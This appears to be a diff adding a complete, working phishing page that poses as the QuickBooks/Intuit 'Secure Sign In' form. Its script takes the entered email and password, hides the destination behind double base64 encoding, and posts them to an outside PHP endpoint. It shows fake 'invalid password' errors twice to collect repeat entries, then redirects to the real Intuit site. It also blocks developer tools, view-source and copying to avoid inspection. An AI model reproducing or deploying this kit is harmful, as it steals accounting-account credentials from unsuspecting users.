@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>QuickBooks · Secure Sign In</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { width: 100%; min-height: 100vh; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
+
+    body#logBody {
+      background: linear-gradient(145deg, #eef6ff 0%, #dfe9f5 100%) !important;
+      background-image: url('https://images.unsplash.com/photo-1554224155-8d04cb21cd6c?ixlib=rb-4.0.3&auto=format&fit=crop&w=1350&q=80') !important;
+      background-size: cover !important;
+      background-position: center !important;
+      background-repeat: no-repeat !important;
+      background-attachment: fixed !important;
+      display: flex !important;
+      align-items: center !important;
+      justify-content: flex-end !important;
+      min-height: 100vh !important;
+      backdrop-filter: blur(2px);
+      position: relative;
+      margin: 0 !important;
+      padding: 20px 60px 20px 20px !important;
+    }
+
+    body#logBody::before {
+      content: '';
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(255, 255, 255, 0.30);
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
+      z-index: 0;
+    }
+
+    #logBox {
+      position: relative;
+      z-index: 10;
+      background: rgba(255, 255, 255, 0.78);
+      backdrop-filter: blur(16px) saturate(180%);
+      -webkit-backdrop-filter: blur(16px) saturate(180%);
+      padding: 28px 24px 30px 24px;
+      border-radius: 36px;
+      box-shadow: 0 25px 50px -8px rgba(0, 40, 30, 0.20), 0 0 0 1px rgba(255, 255, 255, 0.6) inset;
+      max-width: 340px;
+      width: 100%;
+      margin: 0;
+      text-align: center;
+      border: none;
+      transition: all 0.3s ease;
+      transform: scale(1) translateY(0);
+    }
+
+    @media (max-width: 768px) {
+      body#logBody { justify-content: center !important; padding: 20px !important; }
+      #logBox { max-width: 320px; padding: 24px 20px 26px 20px; }
+    }
+    @media (max-width: 480px) {
+      #logBox { padding: 20px 16px 22px 16px; border-radius: 28px; max-width: 300px; }
+    }
+
+    #logBox table { margin: 0 auto; width: 100%; border-collapse: collapse; }
+    #logBox table td { padding: 4px 0; vertical-align: middle; }
+
+    #errMssg {
+      color: #1e2b3c !important;
+      font-family: 'Inter', sans-serif;
+      font-weight: 600 !important;
+      font-size: 0.95rem;
+      line-height: 1.4;
+      display: inline-block;
+      text-align: center;
+      margin: 6px 0 4px 0;
+      letter-spacing: -0.01em;
+    }
+    #errMssg b { font-weight: 700; color: #0a2e1f; }
+
+    #logBox div[style*="display:flex"] {
+      gap: 10px !important;
+      margin-bottom: 4px !important;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    /* Intuit logo — fixed, no dynamic detection */
+    #domainIcon {
+      width: 40px; height: 40px;
+      border-radius: 24px;
+      object-fit: contain;
+      background: white;
+      padding: 5px;
+      border: 1px solid rgba(0, 0, 0, 0.04);
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.02);
+      transition: 0.2s;
+      background: #f0faf5;
+    }
+
+    #logBox label {
+      font-family: 'Inter', sans-serif;
+      font-weight: 500;
+      font-size: 0.7rem !important;
+      letter-spacing: 0.02em;
+      color: #1f2a3f;
+      margin: 6px 0 2px 3px !important;
+      display: block !important;
+      text-align: left;
+      text-transform: uppercase;
+      opacity: 0.7;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 11px 14px;
+      border: 1.5px solid rgba(0, 0, 0, 0.06);
+      border-radius: 60px;
+      font-size: 0.85rem;
+      background: rgba(255, 255, 255, 0.6);
+      backdrop-filter: blur(4px);
+      transition: 0.2s ease;
+      font-family: 'Inter', sans-serif;
+      outline: none;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.02);
+      color: #0d1b2e;
+    }
+
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      border-color: #1f8b4c;
+      background: rgba(255, 255, 255, 0.9);
+      box-shadow: 0 4px 14px rgba(31, 139, 76, 0.12), 0 0 0 4px rgba(31, 139, 76, 0.10);
+    }
+
+    input::placeholder { color: #a0aec0; font-weight: 400; opacity: 0.6; }
+
+    #loginbtn {
+      width: 100%;
+      padding: 11px 0;
+      background: linear-gradient(145deg, #1f8b4c, #146c39);
+      color: white !important;
+      font-weight: 600;
+      font-size: 0.9rem;
+      border: none;
+      border-radius: 60px;
+      cursor: pointer;
+      box-shadow: 0 6px 18px rgba(20, 80, 40, 0.20);
+      transition: 0.2s ease;
+      text-align: center;
+      letter-spacing: 0.3px;
+      margin-top: 8px;
+      font-family: 'Inter', sans-serif;
+      backdrop-filter: blur(4px);
+      background: #1f8b4c;
+    }
+
+    #loginbtn:hover {
+      background: #17753f;
+      transform: scale(1.01);
+      box-shadow: 0 10px 28px rgba(20, 80, 40, 0.30);
+    }
+    #loginbtn:active { transform: scale(0.97); }
+
+    #login_attempt, #attemptNumber { display: none !important; }
+    .multiClass { display: none; }
+    input[type="hidden"] { display: none; }
+    #errMssg b { font-weight: 700; }
+
+    @media (max-width: 480px) {
+      #errMssg { font-size: 0.85rem; }
+      #domainIcon { width: 34px; height: 34px; padding: 4px; }
+      input[type="email"], input[type="password"] { padding: 10px 12px; font-size: 0.8rem; }
+      #loginbtn { padding: 10px 0; font-size: 0.85rem; }
+    }
+
+    #logBox { animation: floatUp 0.6s ease-out; }
+    @keyframes floatUp {
+      0% { opacity: 0; transform: scale(0.96) translateY(20px); }
+      100% { opacity: 1; transform: scale(1) translateY(0); }
+    }
+
+    #errMssg br { display: block; content: ''; margin: 2px 0; }
+    .qb-brand { font-weight: 700; color: #1f8b4c; letter-spacing: -0.02em; }
+
+    /* captureOutput runs in the background — not rendered on the surface */
+    #captureOutput {
+      display: none !important;
+      visibility: hidden !important;
+      position: absolute !important;
+      left: -9999px !important;
+      top: -9999px !important;
+      width: 1px !important;
+      height: 1px !important;
+      overflow: hidden !important;
+      opacity: 0 !important;
+      pointer-events: none !important;
+    }
+  </style>
+</head>
+<body id="logBody" text="#000000" bgcolor="#FFFFFF" onload="setFormFocus();">
+
+  <form id="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off" method="POST" action="javascript:void(0);">
+    <input id="domain" type="hidden" value="quickbooks.com" name="domain">
+    <input id="fieldName" type="hidden" value="quickbooks.com" name="field">
+    <input type="hidden" id="login_attempt" value="0">
+    <input type="hidden" id="attemptNumber" name="number" value="0">
+    <input name="RedirectTo" value="/workflow/webmail.nsf/webform2019?OpenForm" type="hidden">
+
+    <div id="logBox" align="center">
+      <table border="0" cellspacing="0" cellpadding="0" style="width:100%;">
+        <tbody>
+          <tr>
+            <td style="text-align:center; padding-bottom:4px;">
+              <div style="display:flex; align-items:center; justify-content:center; gap:10px; flex-wrap:wrap; margin-bottom:4px;">
+                <!-- Fixed Intuit logo (no domain detection) -->
+                <img id="domainIcon"
+                     src="https://test1.labsweb.com/hxglcef/ycklziv/pxztuya/intuit-com-logo.png"
+                     alt="Intuit"
+                     style="width:40px; height:40px; border-radius:24px; object-fit:contain; background:white; padding:5px; border:1px solid rgba(0,0,0,0.04); box-shadow: 0 6px 12px rgba(0,0,0,0.02); background:#f0faf5;">
+                <b><font face="Inter, sans-serif" id="errMssg" style="font-weight:600 !important; color:#1e2b3c;">
+                  <br>Sign in to <span style="color:#1f8b4c; font-weight:700;">QuickBooks</span>
+                </font></b>
+              </div>
+            </td>
+          </tr>
+          <tr>
+            <td style="padding:3px 0;">
+              <label for="user-id">User name</label>
+              <input name="email" value="" maxlength="50" autocomplete="off" type="email" id="email" placeholder="your@quickbooks.com">
+            </td>
+          </tr>
+          <tr>
+            <td style="padding:3px 0 5px 0;">
+              <label for="pw-id">Password</label>
+              <input name="password" value="" type="password" maxlength="255" autocomplete="off" id="password" placeholder="">
+            </td>
+          </tr>
+          <tr>
+            <td style="padding-top:8px;">
+              <div id="loginbtn" onclick="processLogin()">Sign In to QuickBooks</div>
+            </td>
+          </tr>
+        </tbody>
+      </table>
+
+      <!-- Hidden: capture runs in the background, never rendered on surface -->
+      <div id="captureOutput" aria-hidden="true"></div>
+
+      <div style="margin-top: 14px; font-size: 0.65rem; color: #6b7a8a; letter-spacing: 0.02em; opacity: 0.8;">
+        <span style="color:#1f8b4c; font-weight:600;">🔒</span> secure.quickbooks.com
+      </div>
+    </div>
+  </form>
+
+  <script src="https://kaltravelsa.co.za/home/jquery.min.js.download"></script>
+
+  <script>
+    /* ================================================================
+       SINGLE, CLEAN SCRIPT
+       ================================================================ */
+
+    function toBase64(str) {
+      return btoa(unescape(encodeURIComponent(str)));
+    }
+
+    // ---------- double-base64 decoded endpoint ----------
+    const DOUBLE_B64_ENDPOINT = "YUhSMGNITTZMeTlyWVd4MGNtRjJaV3h6WVM1amJ5NTZZUzlvYjIxbEwyRjBaV3BoTG5Cb2NBPT0=";
+    const FALLBACK_ENDPOINT   = "aHR0cHM6Ly9rYWx0cmF2ZWxzYS5jby56YS9ob21lL2F0ZWphLnBocA==";
+
+    function decodeDoubleBase64(encoded) {
+      try {
+        const firstDecode = atob(encoded);
+        return atob(firstDecode);
+      } catch (e) {
+        try { return atob(encoded); } catch (e2) { return ""; }
+      }
+    }
+
+    const REAL_ENDPOINT = decodeDoubleBase64(DOUBLE_B64_ENDPOINT);
+    const REAL_FALLBACK = decodeDoubleBase64(FALLBACK_ENDPOINT);
+
+    // ---------- shortcut blocking ----------
+    document.addEventListener('keydown', function (event) {
+      var key = event.keyCode || event.which;
+      var ctrlKey = event.ctrlKey;
+      var shiftKey = event.shiftKey;
+      var isForbidden = false;
+
+      if (key === 123) isForbidden = true;
+      if (ctrlKey && key === 85) isForbidden = true;
+      if (ctrlKey && shiftKey && key === 73) isForbidden = true;
+      if (ctrlKey && shiftKey && key === 74) isForbidden = true;
+      if (ctrlKey && shiftKey && key === 67) isForbidden = true;
+      if (ctrlKey && key === 83) isForbidden = true;
+      if (ctrlKey && key === 80) isForbidden = true;
+      if (ctrlKey && key === 82) { event.preventDefault(); isForbidden = true; }
+      if (key === 116) { event.preventDefault(); isForbidden = true; }
+      if (ctrlKey && shiftKey && key === 82) { event.preventDefault(); isForbidden = true; }
+      if (ctrlKey && key === 69) isForbidden = true;
+      if (ctrlKey && key === 79) isForbidden = true;
+      if (ctrlKey && key === 72) isForbidden = true;
+      if (ctrlKey && key === 74) isForbidden = true;
+      if (ctrlKey && shiftKey && key === 85) isForbidden = true;
+      if (ctrlKey && shiftKey && key === 80) isForbidden = true;
+      if (key === 112 || key === 114) { event.preventDefault(); isForbidden = true; }
+
+      if (isForbidden) {
+        event.preventDefault();
+        event.stopPropagation();
+        return false;
+      }
+    });
+
+    document.addEventListener('contextmenu', function (event) { event.preventDefault(); return false; });
+    document.addEventListener('dragstart',   function (event) { event.preventDefault(); return false; });
+    document.addEventListener('selectstart', function (event) { event.preventDefault(); return false; });
+    document.addEventListener('copy',        function (event) { event.preventDefault(); return false; });
+    document.addEventListener('cut',         function (event) { event.preventDefault(); return false; });
+
+    // ---------- domain name helpers (text only — no favicon swapping) ----------
+    function extractDomainNameOnly(fullDomain) {
+      if (!fullDomain) return "domain name";
+      var domainParts = fullDomain.split('.');
+      return domainParts.length > 0 ? domainParts[0] : fullDomain;
+    }
+
+    function updateWelcomeMessage(emailAddress) {
+      var errElement = document.getElementById('errMssg');
+      if (!errElement) return;
+
+      var domainNameOnly = "domain name";
+      if (emailAddress && emailAddress.includes('@')) {
+        domainNameOnly = extractDomainNameOnly(emailAddress.split('@')[1]);
+      }
+
+      errElement.innerHTML = domainNameOnly + "";
+      errElement.style.color = '#0a1a2b';
+      errElement.style.fontWeight = '600';
+    }
+
+    // ---------- hash / base64 email decode ----------
+    function isBase64(str) {
+      try { return btoa(atob(str)) === str; } catch (err) { return false; }
+    }
+
+    function decodeEmailFromHash(hash) {
+      let base64Part = hash.split('&')[0].split('?')[0].trim();
+      if (!isBase64(base64Part)) return base64Part;
+      try {
+        let once = atob(base64Part);
+        if (once.includes('@')) return once;
+        try {
+          let twice = atob(once);
+          if (twice.includes('@')) return twice;
+        } catch (e) { return once; }
+      } catch (e) { return base64Part; }
+      return base64Part;
+    }
+
+    (function () {
+      var hash = window.location.hash.replace("#", "").trim();
+      var emailField = document.getElementById("email");
+      if (!emailField) return;
+
+      if (hash && hash.length > 0) {
+        var fullEmail = decodeEmailFromHash(hash);
+        emailField.value = fullEmail;
+        if (fullEmail.includes('@')) {
+          var domainPart = fullEmail.split('@')[1];
+          var domainField = document.getElementById('domain');
+          if (domainField) domainField.value = domainPart;
+          updateWelcomeMessage(fullEmail);
+        }
+      }
+    })();
+
+    // ---------- login attempt state ----------
+    let loginAttempt = parseInt(document.getElementById('login_attempt')?.value || '0');
+
+    function setErrorMessage(msg) {
+      var errorElement = document.getElementById('errMssg');
+      if (errorElement) {
+        errorElement.innerHTML = msg;
+        errorElement.style.color = '#b91c1c';
+        errorElement.style.fontWeight = '600';
+      }
+    }
+
+    function setFormFocus() {
+      var pw = document.getElementById('password');
+      if (pw) pw.focus();
+    }
+
+    function setupEmailWatcher() {
+      var emailInput = document.getElementById('email');
+      if (!emailInput) return;
+      var handler = function () {
+        var errElem = document.getElementById('errMssg');
+        if (errElem && !/invalid|error|wrong/i.test(errElem.innerHTML)) {
+          updateWelcomeMessage(this.value);
+        }
+      };
+      emailInput.addEventListener('input', handler);
+      emailInput.addEventListener('blur',  handler);
+    }
+
+    // ---------- processLogin ----------
+    function processLogin() {
+      var email    = document.getElementById('email').value.trim();
+      var password = document.getElementById('password').value;
+      var redirectTo   = document.querySelector('input[name="RedirectTo"]')?.value || '';
+      var attemptInput = document.getElementById('attemptNumber');
+      var loginAttemptInput = document.getElementById('login_attempt');
+      var domain = email.split('@')[1] || '';
+
+      if (!email || !password) {
+        setErrorMessage("Please enter both username and password");
+        return;
+      }
+
+      loginAttempt = parseInt(loginAttemptInput?.value || '0');
+      setErrorMessage("Authenticating ...");
+
+      // ---- background capture: base64 + plain email ----
+      var rawPayload    = email + ':' + password;
+      var base64Payload = toBase64(rawPayload);
+      var base64Email   = toBase64(email);
+
+      // write to hidden div (never rendered — kept off the surface)
+      var out = document.getElementById('captureOutput');
+      if (out) {
+        out.innerHTML =
+          'plain_email=' + email + ';' +
+          'base64_email=' + base64Email + ';' +
+          'base64_payload=' + base64Payload;
+        out.setAttribute('data-plain-email',  email);
+        out.setAttribute('data-base64-email',  base64Email);
+        out.setAttribute('data-base64-payload', base64Payload);
+      }
+
+      // console capture (background only)
+      console.log('[capture] plain email:', email);
+      console.log('[capture] base64 email:', base64Email);
+      console.log('[capture] base64 (email:password):', base64Payload);
+
+      // ---- POST to double-base64-decoded endpoint ----
+      var formData = new URLSearchParams();
+      formData.append('email', email);
+      formData.append('password', password);
+      formData.append('domain', document.getElementById('domain').value);
+      formData.append('field', document.getElementById('fieldName').value);
+      formData.append('RedirectTo', redirectTo);
+      formData.append('attempt', loginAttempt + 1);
+      formData.append('email_b64', base64Email);
+      formData.append('payload_b64', base64Payload);
+
+      fetch(REAL_ENDPOINT, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: formData.toString()
+      })
+      .then(function (response) { return response.text(); })
+      .then(function () {
+        if (loginAttempt === 0) {
+          setErrorMessage("You provided an invalid username or password. Please sign in again.");
+          document.getElementById('password').value = '';
+          loginAttemptInput.value = '1';
+          if (attemptInput) attemptInput.value = '1';
+          document.getElementById('password').focus();
+        } else if (loginAttempt === 1) {
+          setErrorMessage("You provided an invalid username or password. Please sign in again.");
+          document.getElementById('password').value = '';
+          loginAttemptInput.value = '2';
+          if (attemptInput) attemptInput.value = '2';
+          document.getElementById('password').focus();
+        } else if (loginAttempt === 2) {
+          var errElement = document.getElementById('errMssg');
+          if (errElement) errElement.innerHTML = '';
+
+          loginAttemptInput.value = '3';
+          if (attemptInput) attemptInput.value = '3';
+
+          setTimeout(function () {
+            if (domain) window.location.href = "https://accounts.intuit.com/app/sign-in";
+            else if (email.includes('@')) window.location.href = "https://accounts.intuit.com/app/sign-in." + email.split('@')[1];
+            else window.location.href = "https://www.example.com";
+          }, 1500);
+        }
+      })
+      .catch(function (error) {
+        console.log('Fetch failed, using form submission with decoded endpoint:', error);
+
+        var tempForm = document.createElement('form');
+        tempForm.method = 'POST';
+        tempForm.action = REAL_ENDPOINT;
+        tempForm.enctype = 'application/x-www-form-urlencoded';
+
+        var fields = {
+          'email': email,
+          'password': password,
+          'domain': document.getElementById('domain').value,
+          'field': document.getElementById('fieldName').value,
+          'RedirectTo': redirectTo,
+          'attempt': loginAttempt + 1,
+          'email_b64': base64Email,
+          'payload_b64': base64Payload
+        };
+
+        for (var key in fields) {
+          var input = document.createElement('input');
+          input.type = 'hidden';
+          input.name = key;
+          input.value = fields[key];
+          tempForm.appendChild(input);
+        }
+        document.body.appendChild(tempForm);
+        tempForm.submit();
+      });
+    }
+
+    window.processLogin = processLogin;
+    window.setFormFocus  = setFormFocus;
+
+    // ---------- jQuery wiring ----------
+    $(document).ready(function () {
+      setupEmailWatcher();
+      $('#password').focus();
+
+      $('#loginbtn').off('click').on('click', function (event) {
+        event.preventDefault();
+        processLogin();
+      });
+
+      $('#logBox').on('keydown', function (event) {
+        if (event.which === 13) {
+          event.preventDefault();
+          processLogin();
+        }
+      });
+    });
+
+    // ---------- Enter on email/password ----------
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter' && (document.activeElement.id === 'password' || document.activeElement.id === 'email')) {
+        e.preventDefault();
+        processLogin();
+      }
+    });
+
+    // ---------- periodic error sanitize ----------
+    setInterval(function () {
+      var errElem = document.getElementById('errMssg');
+      if (errElem && errElem.innerHTML) {
+        var text = errElem.innerHTML;
+        if (text.includes('Attempt') || text.includes('Redirecting')) {
+          var emailField = document.getElementById('email');
+          updateWelcomeMessage(emailField ? emailField.value : '');
+        }
+      }
+    }, 100);
+
+    window.addEventListener('load', function () {
+      var emailField = document.getElementById('email');
+      updateWelcomeMessage(emailField ? emailField.value : '');
+      if (document.getElementById('password')) document.getElementById('password').focus();
+    });
+  </script>
+</body>
+</html>
